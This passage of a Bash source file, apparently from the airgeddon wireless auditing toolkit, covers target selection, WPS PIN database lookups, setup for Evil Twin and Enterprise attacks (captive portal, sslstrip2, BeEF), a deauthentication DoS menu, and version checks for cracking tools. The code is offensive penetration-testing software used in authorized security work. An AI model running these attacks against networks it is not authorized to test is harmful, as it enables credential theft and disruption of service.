			sp4=""
		fi

		airodump_color="${normal_color}"
		client=$(grep "${exp_mac}" < "${tmpdir}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${yellow_color}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names["${i}"]=${exp_essid}
		channels["${i}"]=${exp_channel}
		macs["${i}"]=${exp_mac}
		encs["${i}"]=${exp_enc}
		echo -e "${airodump_color} ${sp1}${i})${client}  ${sp5}${exp_mac}  ${sp2}${exp_channel}    ${sp4}${exp_power}%   ${exp_enc}${sp6}   ${exp_essid}"
	done < "${tmpdir}wnws.txt"

	echo
	if [ "${i}" -eq 1 ]; then
		language_strings "${language}" 70 "yellow"
		selected_target_network=1
		language_strings "${language}" 115 "read"
	else
		language_strings "${language}" 71 "yellow"
		print_large_separator
		language_strings "${language}" 3 "green"
		read -rp "> " selected_target_network
	fi

	while [[ ! ${selected_target_network} =~ ^[[:digit:]]+$ ]] || ((selected_target_network < 1 || selected_target_network > i)); do
		echo
		language_strings "${language}" 72 "red"
		echo
		language_strings "${language}" 3 "green"
		read -rp "> " selected_target_network
	done

	essid=${network_names[${selected_target_network}]}
	check_hidden_essid "normal" "verify"
	channel=${channels[${selected_target_network}]}
	bssid=${macs[${selected_target_network}]}
	enc=${encs[${selected_target_network}]}
}

#Perform a test to determine if fcs parameter is needed on wash scanning
function set_wash_parameterization() {

	debug_print

	fcs=""
	declare -gA wash_ifaces_already_set
	readarray -t WASH_OUTPUT < <(timeout -s SIGTERM 2 wash -i "${interface}" 2> /dev/null)

	for item in "${WASH_OUTPUT[@]}"; do
		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
			fcs=" -C "
			break
		fi
	done

	wash_ifaces_already_set[${interface}]=${fcs}
}

#Check if a type exists in the wps data array
function check_if_type_exists_in_wps_data_array() {

	debug_print

	[[ -n "${wps_data_array["${1}","${2}"]:+not set}" ]]
}

#Check if a pin exists in the wps data array
function check_if_pin_exists_in_wps_data_array() {

	debug_print

	[[ "${wps_data_array["${1}","${2}"]}" =~ (^| )"${3}"( |$) ]]
}

#Fill data into wps data array
function fill_wps_data_array() {

	debug_print

	if ! check_if_pin_exists_in_wps_data_array "${1}" "${2}" "${3}"; then

		if [ "${2}" != "Database" ]; then
			wps_data_array["${1}","${2}"]="${3}"
		else
			if [ "${wps_data_array["${1}","${2}"]}" = "" ]; then
				wps_data_array["${1}","${2}"]="${3}"
			else
				wps_data_array["${1}","${2}"]="${wps_data_array["${1}","${2}"]} ${3}"
			fi
		fi
	fi
}

#Manage and validate the prerequisites for wps pin database attacks
function wps_pin_database_prerequisites() {

	debug_print

	set_wps_mac_parameters

	#shellcheck source=./known_pins.db
	source "${scriptfolder}${known_pins_dbfile}"

	echo
	language_strings "${language}" 384 "blue"
	echo
	search_in_pin_database
	if [ "${bssid_found_in_db}" -eq 1 ]; then
		if [ "${counter_pins_found}" -eq 1 ]; then
			language_strings "${language}" 385 "yellow"
		else
			language_strings "${language}" 386 "yellow"
		fi
	else
		language_strings "${language}" 387 "yellow"
	fi

	if [ "${1}" != "no_attack" ]; then
		check_and_set_common_algorithms
		echo
		language_strings "${language}" 4 "read"
	fi
}

#Manage and validate the prerequisites for Evil Twin and Enterprise attacks
function et_prerequisites() {

	debug_print

	if [ "${retry_handshake_capture}" -eq 1 ]; then
		return
	fi

	clear
	if [ -n "${enterprise_mode}" ]; then
		current_menu="enterprise_attacks_menu"
		case ${enterprise_mode} in
			"smooth")
				language_strings "${language}" 522 "title"
			;;
			"noisy")
				language_strings "${language}" 523 "title"
			;;
		esac
	else
		current_menu="evil_twin_attacks_menu"
		case ${et_mode} in
			"et_onlyap")
				language_strings "${language}" 270 "title"
			;;
			"et_sniffing")
				language_strings "${language}" 291 "title"
			;;
			"et_sniffing_sslstrip2")
				language_strings "${language}" 292 "title"
			;;
			"et_sniffing_sslstrip2_beef")
				language_strings "${language}" 397 "title"
			;;
			"et_captive_portal")
				language_strings "${language}" 293 "title"
			;;
		esac
	fi

	print_iface_selected
	if [ -n "${enterprise_mode}" ]; then
		print_all_target_vars
	else
		print_et_target_vars
		print_iface_internet_selected
	fi

	if [ "${dos_pursuit_mode}" -eq 1 ]; then
		language_strings "${language}" 512 "blue"
	fi
	print_hint ${current_menu}
	echo

	if [ "${et_mode}" != "et_captive_portal" ]; then
		language_strings "${language}" 275 "blue"
		echo
		language_strings "${language}" 276 "yellow"
		print_simple_separator
		ask_yesno 277 "yes"
		if [ "${yesno}" = "n" ]; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi
	fi

	if [[ -z "${mac_spoofing_desired}" ]] || [[ "${mac_spoofing_desired}" -eq 0 ]]; then
		ask_yesno 419 "no"
		if [ "${yesno}" = "y" ]; then
			mac_spoofing_desired=1
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then

		language_strings "${language}" 315 "yellow"
		echo
		language_strings "${language}" 286 "pink"
		print_simple_separator
		if [ "${retrying_handshake_capture}" -eq 0 ]; then
			ask_yesno 321 "no"
		fi

		local msg_mode
		msg_mode="showing_msgs_checking"

		if [[ "${yesno}" = "n" ]] || [[ "${retrying_handshake_capture}" -eq 1 ]]; then
			msg_mode="silent"
			capture_handshake_evil_twin
			case "$?" in
				"2")
					retry_handshake_capture=1
					return
				;;
				"1")
					return_to_et_main_menu=1
					return
				;;
			esac
		else
			ask_et_handshake_file
		fi
		retry_handshake_capture=0
		retrying_handshake_capture=0

		if ! check_bssid_in_captured_file "${et_handshake}" "${msg_mode}" "also_pmkid"; then
			return_to_et_main_menu=1
			return
		fi

		echo
		language_strings "${language}" 28 "blue"

		echo
		language_strings "${language}" 26 "blue"

		echo
		language_strings "${language}" 31 "blue"
	else
		if ! ask_bssid; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
				return_to_et_main_menu_from_beef=1
			fi
			return
		fi

		if ! ask_channel; then
			if [ -n "${enterprise_mode}" ]; then
				return_to_enterprise_main_menu=1
			else
				return_to_et_main_menu=1
			fi
			return
		else
			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"
				if [ -n "${enterprise_mode}" ]; then
					return_to_enterprise_main_menu=1
				else
					return_to_et_main_menu=1
				fi
				return
			fi
		fi
		ask_essid "noverify"
	fi

	if [ -n "${enterprise_mode}" ]; then
		manage_enterprise_log
	elif [ "${et_mode}" = "et_sniffing" ]; then
		manage_ettercap_log
	elif [[ "${et_mode}" = "et_sniffing_sslstrip2" ]] || [[ "${et_mode}" = "et_sniffing_sslstrip2_beef" ]]; then
		manage_bettercap_log
	elif [ "${et_mode}" = "et_captive_portal" ]; then
		manage_captive_portal_log
		language_strings "${language}" 115 "read"
		if set_captive_portal_language; then
			language_strings "${language}" 319 "blue"
			ask_yesno 710 "no"
			if [ "${yesno}" = "y" ]; then
				advanced_captive_portal=1
			fi

			prepare_captive_portal_data

			echo
			language_strings "${language}" 711 "blue"
		else
			return
		fi
	fi

	if [ -n "${enterprise_mode}" ]; then
		return_to_enterprise_main_menu=1
	else
		return_to_et_main_menu=1
		return_to_et_main_menu_from_beef=1
	fi

	if [ "${is_docker}" -eq 1 ]; then
		echo
		if [ -n "${enterprise_mode}" ]; then
			language_strings "${language}" 528 "pink"
		else
			language_strings "${language}" 420 "pink"
		fi
		language_strings "${language}" 115 "read"
	fi

	region_check

	if [ "${channel}" -gt 14 ]; then
		echo
		if [ "${country_code}" = "00" ]; then
			language_strings "${language}" 706 "yellow"
		elif [ "${country_code}" = "99" ]; then
			language_strings "${language}" 719 "yellow"
		else
			language_strings "${language}" 392 "blue"
		fi
	fi

	if hash arping-th 2> /dev/null; then
		right_arping=1
		right_arping_command="arping-th"
	elif hash arping 2> /dev/null; then
		if check_right_arping; then
			right_arping=1
		else
			echo
			language_strings "${language}" 722 "yellow"
			language_strings "${language}" 115 "read"
		fi
	fi

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"
	prepare_et_interface

	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
	echo "${channel}" > "${tmpdir}${channelfile}"

	if [ -n "${enterprise_mode}" ]; then
		exec_enterprise_attack
	else
		case ${et_mode} in
			"et_onlyap")
				exec_et_onlyap_attack
			;;
			"et_sniffing")
				exec_et_sniffing_attack
			;;
			"et_sniffing_sslstrip2")
				exec_et_sniffing_sslstrip2_attack
			;;
			"et_sniffing_sslstrip2_beef")
				exec_et_sniffing_sslstrip2_beef_attack
			;;
			"et_captive_portal")
				exec_et_captive_portal_attack
			;;
		esac
	fi
}

#Manage the Handshake file requirement for captive portal Evil Twin attack
function ask_et_handshake_file() {

	debug_print

	echo
	readpath=0

	if [[ -z "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 312 "blue"
		readpath=1
	elif [[ -z "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -z "${et_handshake}" ]]; then
		language_strings "${language}" 151 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "y" ]; then
			et_handshake="${enteredpath}"
		else
			readpath=1
		fi
	elif [[ -n "${enteredpath}" ]] && [[ -n "${et_handshake}" ]]; then
		language_strings "${language}" 313 "blue"
		ask_yesno 187 "yes"
		if [ "${yesno}" = "n" ]; then
			readpath=1
		fi
	fi

	if [ "${readpath}" -eq 1 ]; then
		validpath=1
		while [[ "${validpath}" != "0" ]]; do
			read_path "ethandshake"
		done
	fi
}

#DoS Evil Twin and Enterprise attacks menu
function et_dos_menu() {

	debug_print

	if [[ -n "${return_to_et_main_menu}" ]] && [[ "${return_to_et_main_menu}" -eq 1 ]]; then
		return
	fi

	if [[ -n "${return_to_enterprise_main_menu}" ]] && [[ "${return_to_enterprise_main_menu}" -eq 1 ]]; then
		return
	fi

	clear
	if [ "${1}" = "enterprise" ]; then
		language_strings "${language}" 520 "title"
	else
		language_strings "${language}" 265 "title"
	fi
	current_menu="et_dos_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	if [ "${1}" = "enterprise" ]; then
		language_strings "${language}" 521
	else
		language_strings "${language}" 266
	fi
	print_simple_separator
	language_strings "${language}" 139 mdk_attack_dependencies[@]
	language_strings "${language}" 140 aireplay_attack_dependencies[@]
	language_strings "${language}" 141 mdk_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " et_dos_option
	case ${et_dos_option} in
		0)
			if [ "${1}" != "enterprise" ]; then
				return_to_et_main_menu_from_beef=1
			fi
			return
		;;
		1)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="${mdk_command}"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		2)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Aireplay"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		3)
			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				et_dos_attack="Auth DoS"

				echo
				language_strings "${language}" 509 "yellow"

				if ! dos_pursuit_mode_et_handler; then
					return
				fi

				if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
					et_prerequisites
				else
					if detect_internet_interface; then
						et_prerequisites
					else
						return
					fi
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	if [ "${1}" = "enterprise" ]; then
		et_dos_menu "${1}"
	else
		et_dos_menu
	fi
}

#Selected internet interface detection
function detect_internet_interface() {

	debug_print

	if [ "${internet_interface_selected}" -eq 1 ]; then
		return 0
	fi

	if [ -n "${internet_interface}" ]; then
		echo
		language_strings "${language}" 285 "blue"
		ask_yesno 284 "yes"
		if [ "${yesno}" = "n" ]; then
			if ! select_secondary_interface "internet"; then
				return 1
			fi
		fi
	else
		if ! select_secondary_interface "internet"; then
			return 1
		fi
	fi

	validate_et_internet_interface
	return $?
}

#Show about and credits
function credits_option() {

	debug_print

	clear
	language_strings "${language}" 105 "title"
	language_strings "${language}" 74 "pink"
	echo
	language_strings "${language}" 73 "blue"
	echo
	echo -e "${green_color}                                                            .-\"\"\"\"-."
	sleep 0.15 && echo -e "                                                           /        \ "
	sleep 0.15 && echo -e "${yellow_color}         ____        ____  __   _______                  ${green_color} /_        _\ "
	sleep 0.15 && echo -e "${yellow_color}  ___  _/_   | _____/_   |/  |_ \   _  \_______         ${green_color} // \      / \\\\\ "
	sleep 0.15 && echo -e "${yellow_color}  \  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \        ${green_color} |\__\    /__/|"
	sleep 0.15 && echo -e "${yellow_color}   \   / |   |\___ \ |   ||  |  \  \_/   \  | \/         ${green_color} \    ||    /"
	sleep 0.15 && echo -e "${yellow_color}    \_/  |___/____  >|___||__|   \_____  /__|             ${green_color} \        /"
	sleep 0.15 && echo -e "${yellow_color}                  \/                   \/                  ${green_color} \  __  / "
	sleep 0.15 && echo -e "                                                             '.__.'"
	sleep 0.15 && echo -e "                                                              |  |${normal_color}"
	echo
	language_strings "${language}" 75 "blue"
	echo
	language_strings "${language}" 85 "pink"
	language_strings "${language}" 107 "pink"
	language_strings "${language}" 421 "pink"
	echo
	language_strings "${language}" 702 "blue"
	for i in "${sponsors[@]}"; do
		echo -ne "${pink_color}\"${i}\" ${normal_color}"
	done
	echo
	echo
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected language
function invalid_language_selected() {

	debug_print

	echo
	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
}

#Show message for captive portal invalid selected language
function invalid_captive_portal_language_selected() {

	debug_print

	language_strings "${language}" 82 "red"
	echo
	language_strings "${language}" 115 "read"
	set_captive_portal_language
}

#Show message for forbidden selected option
function forbidden_menu_option() {

	debug_print

	echo
	language_strings "${language}" 220 "red"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected option
function invalid_menu_option() {

	debug_print

	echo
	language_strings "${language}" 76 "red"
	language_strings "${language}" 115 "read"
}

#Show message for invalid selected interface
function invalid_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_interface
}

#Show message for invalid selected secondary interface
function invalid_secondary_iface_selected() {

	debug_print

	echo
	language_strings "${language}" 77 "red"
	echo
	language_strings "${language}" 115 "read"
	echo
	select_secondary_interface "${1}"
}

#Manage behavior of captured traps
function capture_traps() {

	debug_print

	if [ "${FUNCNAME[1]}" != "check_language_strings" ]; then
		case "${1}" in
			INT|SIGTSTP)
				case ${current_menu} in
					"pre_main_menu"|"select_interface_menu")
						exit_code=1
						exit_script_option
					;;
					*)
						if [ -n "${capture_traps_in_progress}" ]; then
							echo
							language_strings "${language}" 12 "green"
							echo -n "> "
							return
						fi

						capture_traps_in_progress=1
						local previous_default_choice="${default_choice}"
						ask_yesno 12 "yes"
						if [ "${yesno}" = "y" ]; then
							exit_code=1
							capture_traps_in_progress=""
							exit_script_option
						else
							if [ -n "${previous_default_choice}" ]; then
								default_choice="${previous_default_choice}"
								case ${previous_default_choice^^} in
									"Y"|"YES")
										visual_choice="[Y/n]"
									;;
									"N"|"NO")
										visual_choice="[y/N]"
									;;
									"")
										visual_choice="[y/n]"
									;;
								esac
							fi

							language_strings "${language}" 224 "blue"
							if [ "${last_buffered_type1}" = "read" ]; then
								language_strings "${language}" "${last_buffered_message2}" "${last_buffered_type2}"
							else
								language_strings "${language}" "${last_buffered_message1}" "${last_buffered_type1}"
							fi
						fi
					;;
				esac
			;;
			SIGINT|SIGHUP)
				if [ "${no_hardcore_exit}" -eq 0 ]; then
					hardcore_exit
				else
					exit ${exit_code}
				fi
			;;
		esac
	else
		echo
		hardcore_exit
	fi

	capture_traps_in_progress=""
}

#Exit the script managing possible pending tasks
function exit_script_option() {

	debug_print

	action_on_exit_taken=0
	echo
	language_strings "${language}" 106 "title"
	language_strings "${language}" 11 "blue"

	echo
	language_strings "${language}" 165 "blue"

	if [ "${ifacemode}" = "Monitor" ]; then
		ask_yesno 166 "no"
		if [ "${yesno}" = "n" ]; then
			action_on_exit_taken=1
			language_strings "${language}" 167 "multiline"
			if [ "${interface_airmon_compatible}" -eq 1 ]; then
				${airmon} stop "${interface}" > /dev/null 2>&1
			else
				set_mode_without_airmon "${interface}" "managed"
			fi
			ifacemode="Managed"
			time_loop
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	fi

	if [ "${nm_processes_killed}" -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 168 "multiline"
		eval "${networkmanager_cmd} > /dev/null 2>&1"
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ "${routing_modified}" -eq 1 ]; then
		action_on_exit_taken=1
		language_strings "${language}" 297 "multiline"
		clean_routing_rules
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	action_on_exit_taken=1
	language_strings "${language}" 164 "multiline"
	clean_tmpfiles "exit_script"
	time_loop
	echo -e "${green_color} Ok\r${normal_color}"

	if [[ "${spoofed_mac}" -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ "${action_on_exit_taken}" -eq 0 ]; then
		language_strings "${language}" 160 "yellow"
	fi

	echo
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		clean_env_vars
		no_hardcore_exit=1
		if ! kill_tmux_session "${session_name}" > /dev/null; then
			exit ${exit_code}
		fi
	else
		clean_env_vars
		exit ${exit_code}
	fi
}

#Exit the script managing possible pending tasks but not showing anything
function hardcore_exit() {

	debug_print

	exit_code=2
	if [ "${ifacemode}" = "Monitor" ]; then
		${airmon} stop "${interface}" > /dev/null 2>&1
		ifacemode="Managed"
	fi

	if [ "${nm_processes_killed}" -eq 1 ]; then
		eval "${networkmanager_cmd} > /dev/null 2>&1"
	fi

	clean_tmpfiles "exit_script"

	if [ "${routing_modified}" -eq 1 ]; then
		clean_routing_rules
	fi

	if [[ "${spoofed_mac}" -eq 1 ]] && [[ "${ifacemode}" = "Managed" ]]; then
		language_strings "${language}" 418 "multiline"
		restore_spoofed_macs
		time_loop
		echo -e "${green_color} Ok\r${normal_color}"
	fi

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		clean_env_vars
		if ! kill_tmux_session "${session_name}"; then
			exit ${exit_code}
		fi
	else
		clean_env_vars
		exit ${exit_code}
	fi
}

#Generate a small time loop printing some dots
function time_loop() {

	debug_print

	echo -ne " "
	for ((j=1; j<=4; j++)); do
		echo -ne "."
		sleep 0.035
	done
}

#Detect iptables/nftables
function iptables_nftables_detection() {

	debug_print

	if ! "${AIRGEDDON_FORCE_IPTABLES:-false}"; then
		if hash nft 2> /dev/null; then
			iptables_nftables=1
		else
			iptables_nftables=0
		fi
	else
		if ! hash iptables 2> /dev/null && ! hash iptables-legacy 2> /dev/null; then
			echo
			language_strings "${language}" 615 "red"
			exit_code=1
			exit_script_option
		else
			iptables_nftables=0
		fi
	fi

	if [ "${iptables_nftables}" -eq 0 ]; then
		if hash iptables-legacy 2> /dev/null && ! hash iptables 2> /dev/null; then
			iptables_cmd="iptables-legacy"
		elif hash iptables 2> /dev/null && ! hash iptables-legacy 2> /dev/null; then
			iptables_cmd="iptables"
		elif hash iptables 2> /dev/null && hash iptables-legacy 2> /dev/null; then
			iptables_cmd="iptables"
		fi
	else
		iptables_cmd="nft"
	fi
}

#Determine which version of airmon to use
function airmon_fix() {

	debug_print

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

#Set hashcat parameters based on version
function set_hashcat_parameters() {

	debug_print

	hashcat_cmd_fix=""
	hashcat_charset_fix_needed=0
	if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat3_version}"; then

		hashcat_charset_fix_needed=1

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat4_version}"; then
			hashcat_cmd_fix=" -D 2,1 --force"
		else
			hashcat_cmd_fix=" --weak-hash-threshold 0 -D 2,1 --force"
		fi

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hccapx_version}"; then
			hccapx_needed=1
		fi

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_hcx_conversion_version}"; then
			hcx_conversion_needed=1
		fi

		if compare_floats_greater_or_equal "${hashcat_version}" "${hashcat_2500_deprecated_version}"; then
			hashcat_handshake_cracking_plugin="22000"
		fi
	fi
}

#Detects if your arping version is the right one or if it is the bad iputils-arping
function check_right_arping() {

	debug_print

	if arping 2> /dev/null | grep -Eq "^ARPing"; then
		return 0
	fi
	return 1
}

#Determine aircrack version
#shellcheck disable=SC2034
function get_aircrack_version() {

	debug_print

	aircrack_version=$(aircrack-ng --help | grep -i "aircrack-ng" | head -n 1 | awk '{print $2}')
	echo -e "    \r\033[1A"
	[[ ${aircrack_version} =~ ^([0-9]{1,2}\.[0-9]{1,2})\.?([0-9]+|.+)? ]] && aircrack_version="${BASH_REMATCH[1]}"
}

#Determine john the ripper version
#shellcheck disable=SC2034
function get_jtr_version() {

	debug_print

	jtr_version=$(john --help | grep -Eio 'version [a-z0-9\.]+' | awk '{print $2}')
}

#Determine hashcat version
function get_hashcat_version() {

	debug_print

	hashcat_version=$(hashcat -V 2> /dev/null)
	hashcat_version=${hashcat_version#"v"}
}

#Determine hcxdumptool version
function get_hcxdumptool_version() {

	debug_print

	hcxdumptool_version=$(hcxdumptool --version | awk 'NR == 1 {print $2}')
}

#Determine beef version
function get_beef_version() {

	debug_print

	beef_version=$(grep "version" "${beef_path}${beef_default_cfg_file}" 2> /dev/null | grep -oE "[0-9.]+")
}

#Determine bettercap version
function get_bettercap_version() {

	debug_print

	bettercap_version=$(bettercap -v 2> /dev/null | grep -E "^bettercap [0-9]" | awk '{print $2}')
	if [ -z "${bettercap_version}" ]; then
		bettercap_version=$(bettercap -eval "q" 2> /dev/null | grep -E "bettercap v[0-9\.]*" | awk '{print $2}')
		bettercap_version=${bettercap_version#"v"}
	fi
}

#Determine bully version
function get_bully_version() {

	debug_print

	bully_version=$(bully -V 2> /dev/null)
	bully_version=${bully_version#"v"}
	bully_version=${bully_version%"-"*}
}

#Determine reaver version
function get_reaver_version() {

	debug_print

	reaver_version=$(reaver -h 2>&1 > /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
	if [ -z "${reaver_version}" ]; then
		reaver_version=$(reaver -h 2> /dev/null | grep -E "^Reaver v[0-9]" | awk '{print $2}' | grep -Eo "v[0-9\.]+")
	fi
	reaver_version=${reaver_version#"v"}
}

#Set verbosity for bully based on version
function set_bully_verbosity() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_verbosity4_version}"; then
		bully_verbosity="4"
	else
		bully_verbosity="3"
	fi
}

#Validate if bully version is able to perform integrated pixiewps attack
function validate_bully_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${bully_version}" "${minimum_bully_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform integrated pixiewps attack
function validate_reaver_pixiewps_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_pixiewps_version}"; then
		return 0
	fi
	return 1
}

#Validate if reaver version is able to perform null pin attack
function validate_reaver_nullpin_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_reaver_nullpin_version}"; then
		return 0
	fi
	return 1
}

#Validate if wash version is able to perform 5Ghz dual scan
function validate_wash_dualscan_version() {

	debug_print

	if compare_floats_greater_or_equal "${reaver_version}" "${minimum_wash_dualscan_version}"; then
		return 0
	fi
	return 1
}

#Validate if hashcat version is able to perform pmkid cracking
function validate_hashcat_pmkid_version() {

	debug_print

	if compare_floats_greater_or_equal "${hashcat_version}" "${minimum_hashcat_pmkid_version}"; then
		return 0
	fi
	return 1
}

#Set the script folder var if necessary
function set_script_paths() {

	debug_print

	if [ -z "${scriptfolder}" ]; then
		scriptfolder=${0}

		if ! [[ ${0} =~ ^/.*$ ]]; then
			if ! [[ ${0} =~ ^.*/.*$ ]]; then
				scriptfolder="./"
			fi
		fi
		scriptfolder="${scriptfolder%/*}/"
		scriptfolder="$(readlink -f "${scriptfolder}")"
		scriptfolder="${scriptfolder%/}/"
		scriptname="${0##*/}"
	fi

	user_homedir=$(env | grep ^HOME | awk -F = '{print $2}' 2> /dev/null)
	lastcharuser_homedir=${user_homedir: -1}
	if [ "${lastcharuser_homedir}" != "/" ]; then
		user_homedir="${user_homedir}/"
	fi

	plugins_paths=(
					"${scriptfolder}${plugins_dir}"
					"${user_homedir}.airgeddon/${plugins_dir}"
				)
}

#Set the default directory for saving files
function set_default_save_path() {

	debug_print

	if [ "${is_docker}" -eq 1 ]; then
		default_save_path="${docker_io_dir}"
	else
		default_save_path="${user_homedir}"
	fi
}

#Return absolute path for a given string path
function set_absolute_path() {

	debug_print

	local string_path
	string_path=$(readlink -f "${1}")
	if [ -d "${string_path}" ]; then
		string_path="${string_path%/}/"
	fi
	echo "${string_path}"
}

#Check if pins database file exist and try to download the new one if proceed
function check_pins_database_file() {

	debug_print

	if [ -f "${scriptfolder}${known_pins_dbfile}" ]; then
		language_strings "${language}" 376 "yellow"
		echo
		language_strings "${language}" 287 "blue"
		if check_repository_access; then
			get_local_pin_dbfile_checksum "${scriptfolder}${known_pins_dbfile}"
			if ! get_remote_pin_dbfile_checksum; then
				echo
				language_strings "${language}" 381 "yellow"
			else
				echo
				if [ "${local_pin_dbfile_checksum}" != "${remote_pin_dbfile_checksum}" ]; then
					language_strings "${language}" 383 "yellow"
					echo
					if download_pins_database_file; then
						language_strings "${language}" 377 "yellow"
						pin_dbfile_checked=1
					else
						language_strings "${language}" 378 "yellow"
					fi
				else
					language_strings "${language}" 382 "yellow"
					pin_dbfile_checked=1
				fi
			fi
		else
			echo
			language_strings "${language}" 375 "yellow"
			ask_for_pin_dbfile_download_retry
		fi
		return 0
	else
		language_strings "${language}" 374 "yellow"
		echo
		if hash curl 2> /dev/null; then
			language_strings "${language}" 287 "blue"
			if ! check_repository_access; then
				echo
				language_strings "${language}" 375 "yellow"
				return 1
			else
				echo
				if download_pins_database_file; then
					language_strings "${language}" 377 "yellow"
					pin_dbfile_checked=1
					return 0
				else
					language_strings "${language}" 378 "yellow"
					return 1
				fi
			fi
		else
			language_strings "${language}" 414 "yellow"
			return 1
		fi
	fi
}

#Get and write options form options config file
function update_options_config_file() {

	debug_print

	case "${1}" in
		"getdata")
			readarray -t OPTION_VARS < <(grep "AIRGEDDON_" "${rc_path}" 2> /dev/null)
		;;
		"writedata")
			local option_name
			local option_value
			for item in "${OPTION_VARS[@]}"; do
				option_name="${item%=*}"
				option_value="${item#*=}"
				for item2 in "${ordered_options_env_vars[@]}"; do
					if [ "${item2}" = "${option_name}" ]; then
						sed -ri "s:(${option_name})=(.+):\1=${option_value}:" "${rc_path}" 2> /dev/null
					fi
				done
			done
		;;
	esac
}

#Download the options config file
function download_options_config_file() {

	debug_print

	local options_config_file_downloaded=0
	options_config_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_options_config_file} 2> /dev/null)

	if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
		options_config_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			options_config_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_options_config_file} 2> /dev/null)
			if [[ -n "${options_config_file}" ]] && [[ "${options_config_file}" != "${curl_404_error}" ]]; then
				options_config_file_downloaded=1
			fi
		fi
	fi

	if [ "${options_config_file_downloaded}" -eq 1 ]; then
		rm -rf "${rc_path}" 2> /dev/null
		echo "${options_config_file}" > "${rc_path}"
		return 0
	else
		return 1
	fi
}

#Download the pins database file
function download_pins_database_file() {

	debug_print

	local pindb_file_downloaded=0
	remote_pindb_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_pins_dbfile} 2> /dev/null)

	if [[ -n "${remote_pindb_file}" ]] && [[ "${remote_pindb_file}" != "${curl_404_error}" ]]; then
		pindb_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_pindb_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_pins_dbfile} 2> /dev/null)
